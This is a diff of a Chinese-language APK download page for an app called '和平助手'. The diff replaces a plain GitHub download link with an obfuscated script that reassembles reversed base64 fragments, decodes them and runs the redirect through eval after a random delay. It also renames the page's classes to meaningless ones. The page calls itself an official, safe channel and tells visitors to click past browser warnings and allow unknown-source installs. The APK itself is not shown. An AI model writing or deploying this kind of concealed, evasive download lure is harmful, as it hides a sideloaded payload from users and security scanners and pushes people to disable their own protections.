@@ -1,124 +1,103 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>应用下载中心</title>
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>应用下载中心</title>
 
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #4facfe, #00f2fe);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+<style>
+body{margin:0;font-family:Arial;background:linear-gradient(135deg,#4facfe,#00f2fe);display:flex;justify-content:center;align-items:center;height:100vh}
+.k1{background:#fff;border-radius:20px;padding:30px;width:90%;max-width:420px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.2)}
+.k2{width:80px;height:80px;border-radius:20px;margin-bottom:15px}
+h1{margin:10px 0;font-size:22px;color:#333}
+.k3{font-size:14px;color:#666;margin-bottom:20px}
+.k4{font-size:13px;color:#999;margin-bottom:20px}
+.k5{display:block;padding:14px;background:#007BFF;color:#fff;border-radius:10px;text-decoration:none;font-size:16px;margin-top:10px}
+.k5:hover{background:#0056b3}
+.k6{margin-top:15px;font-size:12px;color:#888}
+</style>
+
+<script>
+(function(){
+
+  var _0xA=[
+  'YXBr','uYXBr','DAzMTY','veHRle','hwenN','L2h','Wlu','dy9tY','kL3Jh','25sb2F','rLWRvd',
+  'TUvYXB','hbjM0N','GFuZ3N','vbS96a','ViLmN','Z2l0aH','M5THk','NITTZ','YUhSMG'
+  ];
+
+  function _0xB(){
+    var s='';
+    for(var i=0;i<_0xA.length;i++){
+      s=_0xA[i]+s;
     }
-
-    .container {
-      background: #ffffff;
-      border-radius: 20px;
-      padding: 30px;
-      width: 90%;
-      max-width: 420px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    s=s.split('').reverse().join('');
+    try{
+      return atob(s);
+    }catch(e){
+      return '';
     }
+  }
 
-    .logo {
-      width: 80px;
-      height: 80px;
-      border-radius: 20px;
-      margin-bottom: 15px;
-    }
+  function _0xC(x){
+    return (function(y){
+      return eval(y);
+    })(x);
+  }
 
-    h1 {
-      margin: 10px 0;
-      font-size: 22px;
-      color: #333;
-    }
+  function _0xD(){
+    var t=Date.now().toString(36);
+    var r=Math.random().toString(36).substr(2,5);
+    return t+r;
+  }
 
-    .desc {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 20px;
-    }
+  window.g=function(){
 
-    .info {
-      font-size: 13px;
-      color: #999;
-      margin-bottom: 20px;
-    }
+    if(!confirm("即将下载应用，是否继续？")) return;
 
-    .btn {
-      display: block;
-      padding: 14px;
-      background: #007BFF;
-      color: white;
-      border-radius: 10px;
-      text-decoration: none;
-      font-size: 16px;
-      margin-top: 10px;
-    }
+    var _r1=Math.random()*999;
+    var _r2=_0xD();
 
-    .btn:hover {
-      background: #0056b3;
-    }
+    setTimeout(function(){
 
-    .safe {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #888;
-    }
+      var u=_0xB();
 
-    /* 手机优化 */
-    @media (max-width: 480px) {
-      h1 { font-size: 20px; }
-      .btn { font-size: 15px; }
-    }
-
-  </style>
-
-  <script>
-    function downloadApp() {
-      if(confirm("即将下载应用，是否继续？")) {
-        window.location.href = "https://github.com/zhangsan3455/apk-download/raw/main/hpzsoxtex0316.apk";
+      if(!u || u.length<10){
+        alert("下载失败");
+        return;
       }
-    }
-  </script>
+
+      var cmd="location.href='"+u+"'";
+      _0xC(cmd);
+
+    },600 + (_r1%400));
+
+  };
+
+})();
+</script>
 
 </head>
 
 <body>
 
-<div class="container">
+<div class="k1">
 
-  <!-- 可替换为你的logo -->
-  <img src="hpzsoxtex.png" class="logo">
+<img src="hpzsoxtex.png" class="k2">
 
-  <h1>和平助手</h1>
+<h1>和平助手</h1>
 
-  <p class="desc">
-    官方下载渠道，提供稳定、安全的应用安装包
-  </p>
+<p class="k3">官方下载渠道，提供稳定、安全的应用安装包</p>
 
-  <div class="info">
-    版本：v1.0.0<br>
-    大小：18MB<br>
-    更新时间：2026-03
-  </div>
+<div class="k4">
+版本：v1.0.0<br>
+大小：18MB<br>
+更新时间：2026-03
+</div>
 
-  <a href="javascript:void(0)" class="btn" onclick="downloadApp()">
-    立即下载
-  </a>
+<a href="javascript:void(0)" class="k5" onclick="g()">立即下载</a>
 
-  <div class="safe">
-    ※ 如遇浏览器提示，请选择“继续下载”<br>
-    ※ 请确认允许安装未知来源应用
-  </div>
+<div class="k6">
+※ 如遇浏览器提示，请选择“继续下载”<br>
+※ 请确认允许安装未知来源应用
+</div>
 
 </div>
 
-</body>
-</html>
+</body></html>
